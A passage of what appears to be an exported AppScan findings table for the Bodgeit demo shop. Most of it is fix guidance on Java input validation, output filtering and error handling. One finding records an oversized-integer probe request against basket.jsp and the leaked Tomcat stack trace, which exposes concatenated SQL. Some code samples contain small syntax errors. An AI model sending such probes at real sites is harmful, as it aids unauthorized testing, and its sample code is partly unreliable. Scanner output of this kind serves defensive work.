supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a DoubleRangeValidator on a component</text> <text>validate_length: registers a LengthValidator on a component</text> <text>validate_longrange: registers a LongRangeValidator on a component</text> <text>validate_required: registers a RequiredValidator on a component</text> <text>validate_stringrange: registers a StringRangeValidator on a component</text> <text>validator: registers a custom Validator on a component</text> <br></br> <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text> <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text> <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text> <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text> <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text> <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text> <text>input_text: accepts a text string of one line.</text> <text>output_text: displays a text string of one line.</text> <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text> <text>input_hidden: allows a page author to include a hidden variable in a page</text> <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text> <text>input_textarea: accepts multiple lines of text</text> <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text> <text>output_label: displays a nested component as a label for a specified input field</text> <text>output_message: displays a localized message</text> <br></br> <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text> <code> <%@ taglib uri=""http://java.sun.com/jsf/html"" prefix=""h"" %> <%@ taglib uri=""http://java.sun.com/jsf/core"" prefix=""f"" %> ... <jsp:useBean id=""UserBean"" class=""myApplication.UserBean"" scope=""session"" /> <f:use_faces> <h:form formName=""loginForm"" > <h:input_text id=""userName"" size=""20"" modelReference=""UserBean.userName""> <f:validate_required/> <f:validate_length minimum=""8"" maximum=""20""/> </h:input_text> <!-- display errors if present --> <h:output_errors id=""loginErrors"" clientId=""userName""/> <h:command_button id=""submit"" label=""Submit"" commandName=""submit"" /><p> </h:form> </f:use_faces> </code> <br></br> <br></br> <text>REFERENCES</text> <text>Java API 1.3 - </text> <link target=""http://java.sun.com/j2se/1.3/docs/api/"">http://java.sun.com/j2se/1.3/docs/api/</link> <text>Java API 1.4 - </text> <link target=""http://java.sun.com/j2se/1.4/docs/api/"">http://java.sun.com/j2se/1.4/docs/api/</link> <text>Java Servlet API 2.3 - </text> <link target=""http://java.sun.com/products/servlet/2.3/javadoc/"">http://java.sun.com/products/servlet/2.3/javadoc/</link> <text>Java Regular Expression Package - </text> <link target=""http://jakarta.apache.org/regexp/"">http://jakarta.apache.org/regexp/</link> <text>Jakarta Validator - </text> <link target=""http://jakarta.apache.org/commons/validator/"">http://jakarta.apache.org/commons/validator/</link> <text>JavaServer Faces Technology - </text> <link target=""http://java.sun.com/j2ee/javaserverfaces/"">http://java.sun.com/j2ee/javaserverfaces/</link> <br></br> <text>** Error Handling:</text> <br></br> <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern. In this pattern a Servlet acts as a Controller. A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model). The Servlet then forwards the request to a JSP (View) to render the processing results. Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text> <br></br> <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces. A good error handling strategy addresses the following items:</text> <br></br> <text>[1] Defining Errors</text> <text>[2] Reporting Errors</text> <text>[3] Rendering Errors</text> <text>[4] Error Mapping</text> <br></br> <text>[1] Defining Errors</text> <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided. Instead, the application should use error keys that map to known application failures. A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties. For example, if the ""user_name"" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text> <br></br> <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the ""user_name"" field is required;</text> <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the ""user_name"" field should be alphanumeric;</text> <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the ""user_name"" value is a duplicate in the database;</text> <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the ""user_name"" value is invalid;</text> <br></br> <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text> <br></br> <text>- ErrorKeys: defines all error keys</text> <br></br> <code> // Example: ErrorKeys defining the following error keys: // - ERROR_USERNAME_REQUIRED // - ERROR_USERNAME_ALPHANUMERIC // - ERROR_USERNAME_DUPLICATE // - ERROR_USERNAME_INVALID // ... public Class ErrorKeys { public static final String ERROR_USERNAME_REQUIRED = ""error.username.required""; public static final String ERROR_USERNAME_ALPHANUMERIC = ""error.username.alphanumeric""; public static final String ERROR_USERNAME_DUPLICATE = ""error.username.duplicate""; public static final String ERROR_USERNAME_INVALID = ""error.username.invalid""; ... } </code> <indentText> </indentText> <text>- Error: encapsulates an individual error</text> <br></br> <code> // Example: Error encapsulates an error key. // Error is serializable to support code executing in multiple JVMs. public Class Error implements Serializable { // Constructor given a specified error key public Error(String key) { this(key, null); } // Constructor given a specified error key and array of placeholder objects public Error(String key, Object[] values) { this.key = key; this.values = values; } // Returns the error key public String getKey() { return this.key; } // Returns the placeholder values public Object[] getValues() { return this.values; } private String key = null; private Object[] values = null; } </code> <br></br> <text>- Errors: encapsulates a Collection of errors</text> <br></br> <code> // Example: Errors encapsulates the Error objects being reported to the presentation layer. // Errors are stored in a HashMap where the key is the bean property name and value is an // ArrayList of Error objects. public Class Errors implements Serializable { // Adds an Error object to the Collection of errors for the specified bean property. public void addError(String property, Error error) { ArrayList propertyErrors = (ArrayList)errors.get(property); if (propertyErrors == null) { propertyErrors = new ArrayList(); errors.put(property, propertyErrors); } propertyErrors.put(error); } // Returns true if there are any errors public boolean hasErrors() { return (errors.size > 0); } // Returns the Errors for the specified property public ArrayList getErrors(String property) { return (ArrayList)errors.get(property); } private HashMap errors = new HashMap(); } </code> <br></br> <text>Using the above framework classes, here is an example to process validation errors of the ""user_name"" field:</text> <br></br> <code> // Example to process validation errors of the ""user_name"" field. Errors errors = new Errors(); String userName = request.getParameter(""user_name""); // (a) Required validation rule if (!Validator.validateRequired(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED)); } // (b) Alpha-numeric validation rule else if (!Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC)); } else { // (c) Duplicate check validation rule // We assume that there is an existing UserValidationEJB session bean that implements // a checkIfDuplicate() method to verify if the user already exists in the database. try { ... if (UserValidationEJB.checkIfDuplicate(userName)) { errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE)); } } catch (RemoteException e) { // log the error logger.error(""Could not validate user for specified userName: "" + userName); errors.addError(""user_name"", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE); } } // set the errors object in a request attribute called ""errors"" request.setAttribute(""errors"", errors); ... </code> <br></br> <text>[2] Reporting Errors</text> <text>There are two ways to report web-tier application errors:</text> <text>(a) Servlet Error Mechanism</text> <text>(b) JSP Error Mechanism</text> <br></br> <text>[2-a] Servlet Error Mechanism</text> <text>A Servlet may report errors by:</text> <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text> <text>- calling response.sendError with an HTTP error code argument, OR</text> <text>- throwing an exception</text> <br></br> <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data. The following example illustrates how to forward to an input JSP (userInput.jsp):</text> <br></br> <code> // Example to forward to the userInput.jsp following user validation errors RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd != null) { rd.forward(request, response); } </code> <br></br> <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument. Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes. </text> <br></br> <text>Example to return a HTTP error:</text> <code> // Example to return a HTTP error code RequestDispatcher rd = getServletContext().getRequestDispatcher(""/user/userInput.jsp""); if (rd == null) { // messages is a resource bundle with all message keys and values response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID)); } </code> <br></br> <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text> <text>- RuntimeException</text> <text>- ServletException</text> <text>- IOException</text> <br></br> <text>[2-b] JSP Error Mechanism</text> <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text> <br></br> <code> <%@ page errorPage=""/errors/userValidation.jsp"" %> </code> <br></br> <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request p...""\\n""...data exceeds space allotted for cell.","","",""
"DemoApps","","Bodgeit","105","Integer Overflow","","Info","Open","2015-10-15","IBM Security AppScan Standard","190","Integer Overflow or Wraparound","","/bodgeit/basket.jsp","quantity_11","","http://localhost/bodgeit/basket.jsp","Parameter: quantity_11=1 -> quantity_11=18446744073709551617","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31; b_id=3 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/basket.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 53 quantity_11=18446744073709551617&update=Update+Basket HTTP/1.1 500 Internal Server Error Server: Apache-Coyote/1.1 Content-Type: text/html;charset=utf-8 Content-Language: en Content-Length: 3048 Date: Thu, 15 Oct 2015 22:23:41 GMT Connection: close <html><head><title>Apache Tomcat/7.0.68 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 500 - An exception occurred processing JSP page /basket.jsp at line 244</h1><HR size=""1"" noshade=""noshade""><p><b>type</b> Exception report</p><p><b>message</b> <u>An exception occurred processing JSP page /basket.jsp at line 244</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b> <pre>org.apache.jasper.JasperException: An exception occurred processing JSP page /basket.jsp at line 244 241: stmt.execute(); 242: stmt.close(); 243: } else { 244: stmt = conn.prepareStatement(&quot;UPDATE BasketContents SET quantity = &quot; + Integer.parseInt(value) + &quot; WHERE basketid=&quot; + basketId + 245: &quot; AND productid = &quot; + prodId); 246: stmt.execute(); 247: if (Integer.parseInt(value) &lt; 0) { Stacktrace: org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:575) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:477) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>root cause</b> <pre>java.lang.NumberFormatException: For input string: &quot;18446744073709551617&quot; java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) java.lang.Integer.parseInt(Integer.java:583) java.lang.Integer.parseInt(Integer.java:615) org.apache.jsp.basket_jsp._jspService(basket_jsp.java:332) org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439) org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395) org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339) javax.servlet.http.HttpServlet.service(HttpServlet.java:731) org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) </pre></p><p><b>note</b> <u>The full stack trace of the root cause is available in the Apache Tomcat/7.0.68 logs.</u></p><HR size=""1"" noshade=""noshade""><h3>Apache Tomcat/7.0.68</h3></body></html>","","The application has responded with an error message, indicating an undefined state that may expose sensitive information.","<fixRecommendations> <fixRecommendation type=""General""> <text>[1] Check incoming requests for the presence of all expected parameters and values. When a parameter is missing, issue a proper error message or use default values.</text> <text>[2] The application should verify that its input consists of valid characters (after decoding). For example, an input value containing the null byte (encoded as %00), apostrophe, quotes, etc. should be rejected.</text> <text>[3] Enforce values in their expected ranges and types. If your application expects a certain parameter to have a value from a certain set, then the application should ensure that the value it receives indeed belongs to the set. For example, if your application expects a value in the range 10..99, then it should make sure that the value is indeed numeric, and that its value is in 10..99.</text> <text>[4] Verify that the data belongs to the set offered to the client.</text> <text>[5] Do not output debugging error messages and exceptions in a production environment.</text> </fixRecommendation> <fixRecommendation type=""ASP.NET""> <text>In order to disable debugging in ASP.NET, edit your web.config file to contain the following:</text> <text><compilation </text> <indentText> debug=""false""</indentText> <text>/></text> <br></br> <text>For more information, see ""HOW TO: Disable Debugging for ASP.NET Applications"" in: </text> <link target=""http://support.microsoft.com/default.aspx?scid=kb;en-us;815157"">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</link> <br></br> <text>You can add input validation to Web Forms pages by using validation controls. Validation controls provide an easy-to-use mechanism for all common types of standard validation (for example, testing for valid dates or values within a range), plus ways to provide custom-written validation. In addition, validation controls allow you to completely customize how error information is displayed to the user. Validation controls can be used with any controls that are processed in a Web Forms page's class file, including both HTML and Web server controls.</text> <br></br> <text>To make sure that all the required parameters exist in a request, use the ""RequiredFieldValidator"" validation control. This control ensures that the user does not skip an entry in the web form.</text> <br></br> <text>To make sure user input contains only valid values, you can use one of the following validation controls:</text> <br></br> <text>[1] ""RangeValidator"": checks that a user's entry (value) is between specified lower and upper boundaries. You can check ranges within pairs of numbers, alphabetic characters, and dates.</text> <br></br> <text>[2] ""RegularExpressionValidator"": checks that the entry matches a pattern defined by a regular expression. This type of validation allows you to check for predictable sequences of characters, such as those in social security numbers, e-mail addresses, telephone numbers, postal codes, and so on.</text> <br></br> <text>Important note: validation controls do not block user input or change the flow of page processing; they only set an error state, and produce error messages. It is the programmer's responsibility to test the state of the controls in the code before performing further application-specific actions.</text> <br></br> <text>There are two ways to check for user input validity: </text> <br></br> <text>1. Test for a general error state: </text> <br></br> <text>In your code, test the page's IsValid property. This property rolls up the values of the IsValid properties of all the validation controls on the page (using a logical AND). If one of the validation controls is set to invalid, the page's property will return false.</text> <br></br> <text>2. Test for the error state of individual controls:</text> <br></br> <text>Loop through the page's Validators collection, which contains references to all the validation controls. You can then examine the IsValid property of each validation control.</text> </fixRecommendation> <fixRecommendation type=""J2EE""> <text>** Input Data Validation:</text> <br></br> <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets. Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text> <br></br> <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text> <text>[1] Required field</text> <text>[2] Field data type (all HTTP request parameters are Strings by default)</text> <text>[3] Field length</text> <text>[4] Field range</text> <text>[5] Field options</text> <text>[6] Field pattern</text> <text>[7] Cookie values</text> <text>[8] HTTP Response</text> <br></br> <text>A good practice is to implement the above routine as static methods in a ""Validator"" utility class. The following sections describe an example validator class.</text> <br></br> <text>[1] Required field</text> <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces. </text> <br></br> <text>Example of how to validate required fields:</text> <br></br> <code> // Java example to validate required fields public Class Validator { ... public static boolean validateRequired(String value) { boolean isFieldValid = false; if (value != null && value.trim().length() > 0) { isFieldValid = true; } return isFieldValid; } ... } ... String fieldValue = request.getParameter(""fieldName""); if (Validator.validateRequired(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>[2] Field data type</text> <text>In web applications, input parameters are poorly typed. For example, all HTTP request parameters or cookie values are of type String. The developer is responsible for verifying the input is of the correct data type. Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text> <br></br> <text>Example of how to validate a numeric field (type int):</text> <br></br> <code> // Java example to validate that a field is an int number public Class Validator { ... public static boolean validateInt(String value) { boolean isFieldValid = false; try { Integer.parseInt(value); isFieldValid = true; } catch (Exception e) { isFieldValid = false; } return isFieldValid; } ... } ... // check if the HTTP request parameter is of type int String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // fieldValue is valid, continue processing request ... } </code> <br></br> <text>A good practice is to convert all HTTP request parameters to their respective data types. For example, store the ""integerValue"" of a request parameter in a request attribute and use it as shown in the following example:</text> <br></br> <code> // Example to convert the HTTP request parameter to a primitive wrapper data type // and store this value in a request attribute for further processing String fieldValue = request.getParameter(""fieldName""); if (Validator.validateInt(fieldValue)) { // convert fieldValue to an Integer Integer integerValue = Integer.getInteger(fieldValue); // store integerValue in a request attribute request.setAttribute(""fieldName"", integerValue); } ... // Use the request attribute for further processing Integer integerValue = (Integer)request.getAttribute(""fieldName""); ... </code> <br></br> <text>The primary Java data types that the application should handle:</text> <text>- Byte</text> <text>- Short</text> <text>- Integer</text> <text>- Long</text> <text>- Float</text> <text>- Double</text> <text>- Date</text> <br></br> <text>[3] Field length</text> <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text> <br></br> <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text> <br></br> <code> // Example to validate the field length public Class Validator { ... public static boolean validateLength(String value, int minLength, int maxLength) { String validatedValue = value; if (!validateRequired(value)) { validatedValue = """"; } return (validatedValue.length() >= minLength && validatedValue.length() <= maxLength); } ... } ... String userName = request.getParameter(""userName""); if (Validator.validateRequired(userName)) { if (Validator.validateLength(userName, 8, 20)) { // userName is valid, continue further processing ... } } </code> <br></br> <text>[4] Field range</text> <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text> <br></br> <text>Example to validate that the input numberOfChoices is between 10 and 20:</text> <br></br> <code> // Example to validate the field range public Class Validator { ... public static boolean validateRange(int value, int min, int max) { return (value >= min && value <= max); } ... } ... String fieldValue = request.getParameter(""numberOfChoices""); if (Validator.validateRequired(fieldValue)) { if (Validator.validateInt(fieldValue)) { int numberOfChoices = Integer.parseInt(fieldValue); if (Validator.validateRange(numberOfChoices, 10, 20)) { // numberOfChoices is valid, continue processing request ... } } } </code> <br></br> <text>[5] Field options</text> <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options. Remember that a malicious user can easily modify any option value. Always validate the selected user value against the allowed options as defined by the functional requirements.</text> <br></br> <text>Example to validate the user selection against a list of allowed options:</text> <br></br> <code> // Example to validate user selection against a list of options public Class Validator { ... public static boolean validateOption(Object[] options, Object value) { boolean isValidValue = false; try { List list = Arrays.asList(options); if (list != null) { isValidValue = list.contains(value); } } catch (Exception e) { } return isValidValue; } ... } ... // Allowed options String[] options = {""option1"", ""option2"", ""option3""); // Verify that the user selection is one of the allowed options String userSelection = request.getParameter(""userSelection""); if (Validator.validateOption(options, userSelection)) { // valid user selection, continue processing request ... } </code> <br></br> <text>[6] Field pattern</text> <text>Always check that the user input matches a pattern as defined by the functionality requirements. For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text> <text>^[a-zA-Z0-9]*$</text> <br></br> <text>Java 1.3 or earlier versions do not include any regular expression packages. Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support. </text> <text>Example to perform regular expression validation:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Apache regular expression package import org.apache.regexp.RE; import org.apache.regexp.RESyntaxException; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { RE r = new RE(expression); match = r.match(value); } return match; } ... } ... // Verify that the userName request parameter is alpha-numeric String userName = request.getParameter(""userName""); if (Validator.matchPattern(userName, ""^[a-zA-Z0-9]*$"")) { // userName is valid, continue processing request ... } </code> <br></br> <text>Java 1.4 introduced a new regular expression package (java.util.regex). Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text> <br></br> <code> // Example to validate that a given value matches a specified pattern // using the Java 1.4 regular expression package import java.util.regex.Pattern; import java.util.regexe.Matcher; public Class Validator { ... public static boolean matchPattern(String value, String expression) { boolean match = false; if (validateRequired(expression)) { match = Pattern.matches(expression, value); } return match; } ... } </code> <br></br> <text>[7] Cookie value</text> <text>Use the javax.servlet.http.Cookie object to validate the cookie value. The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text> <br></br> <text>Example to validate a required cookie value:</text> <br></br> <code> // Example to validate a required cookie value // First retrieve all available cookies submitted in the HTTP request Cookie[] cookies = request.getCookies(); if (cookies != null) { // find the ""user"" cookie for (int i=0; i<cookies.length; ++i) { if (cookies[i].getName().equals(""user"")) { // validate the cookie value if (Validator.validateRequired(cookies[i].getValue()) { // valid cookie value, continue processing request ... } } } } </code> <br></br> <text>[8] HTTP Response</text> <text>[8-1] Filter user input</text> <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities. These are the HTML sensitive characters:</text> <text>< > "" ' % ; ) ( & +</text> <br></br> <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text> <br></br> <code> // Example to filter sensitive data to prevent cross-site scripting public Class Validator { ... public static String filter(String value) { if (value == null) { return null; } StringBuffer result = new StringBuffer(value.length()); for (int i=0; i<value.length(); ++i) { switch (value.charAt(i)) { case '<': result.append(""&lt;""); break; case '>': result.append(""&gt;""); break; case '""': result.append(""&quot;""); break; case '\'': result.append(""&#39;""); break; case '%': result.append(""&#37;""); break; case ';': result.append(""&#59;""); break; case '(': result.append(""&#40;""); break; case ')': result.append(""&#41;""); break; case '&': result.append(""&amp;""); break; case '+': result.append(""&#43;""); break; default: result.append(value.charAt(i)); break; } return result; } ... } ... // Filter the HTTP response using Validator.filter PrintWriter out = response.getWriter(); // set output response out.write(Validator.filter(response)); out.close(); </code> <br></br> <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text> <br></br> <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text> <br></br> <code> // Example to filter all sensitive characters in the HTTP response using a Java Filter. // This example is for illustration purposes since it will filter all content in the response, including HTML tags! public class SensitiveCharsFilter implements Filter { ... public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { PrintWriter out = response.getWriter(); ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response); chain.doFilter(request, wrapper); CharArrayWriter caw = new CharArrayWriter(); caw.write(Validator.filter(wrapper.toString())); response.setContentType(""text/html""); response.setContentLength(caw.toString().length()); out.write(caw.toString()); out.close(); } ... public class CharResponseWrapper extends HttpServletResponseWrapper { private CharArrayWriter output; public String toString() { return output.toString(); } public CharResponseWrapper(HttpServletResponse response){ super(response); output = new CharArrayWriter(); } public PrintWriter getWriter(){ return new PrintWriter(output); } } } } </code> <br></br> <text>[8-2] Secure the cookie</text> <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie using a secure protocol, such as HTTPS or SSL.</text> <br></br> <text>Example to secure the ""user"" cookie:</text> <br></br> <code> // Example to secure a cookie, i.e. instruct the browser to // send the cookie using a secure protocol Cookie cookie = new Cookie(""user"", ""sensitive""); cookie.setSecure(true); response.addCookie(cookie); </code> <br></br> <text>RECOMMENDED JAVA TOOLS</text> <text>The two main Java frameworks for server-side validation are:</text> <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text> <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements. These rules are configured in an XML file that defines input validation rules for form fields. Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag. This filtering may be disabled by setting the 'filter=false' flag.</text> <br></br> <text>Struts defines the following basic input validators, but custom validators may also be defined:</text> <text>required: succeeds if the field contains any characters other than white space.</text> <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text> <text>range: succeeds if the value is within the values given by the min and max attributes ((value >= min) & (value <= max)).</text> <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text> <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text> <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text> <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text> <text>creditCard: succeeds if the value could be a valid credit card number.</text> <text>e-mail: succeeds if the value could be a valid e-mail address.</text> <br></br> <text>Example to validate the userName field of a loginForm using Struts Validator:</text> <code> <form-validation> <global> ... <validator name=""required"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateRequired"" msg=""errors.required""> </validator> <validator name=""mask"" classname=""org.apache.struts.validator.FieldChecks"" method=""validateMask"" msg=""errors.invalid""> </validator> ... </global> <formset> <form name=""loginForm""> <!-- userName is required and is alpha-numeric case insensitive --> <field property=""userName"" depends=""required,mask""> <!-- message resource key to display if validation fails --> <msg name=""mask"" key=""login.userName.maskmsg""/> <arg0 key=""login.userName.displayname""/> <var> <var-name>mask</var-name> <var-value>^[a-zA-Z0-9]*$</var-value> </var> </field> ... </form> ... </formset> </form-validation> </code> <br></br> <text>[2] JavaServer Faces Technology</text> <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text> <br></br> <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text> <text>validate_doublerange: registers a 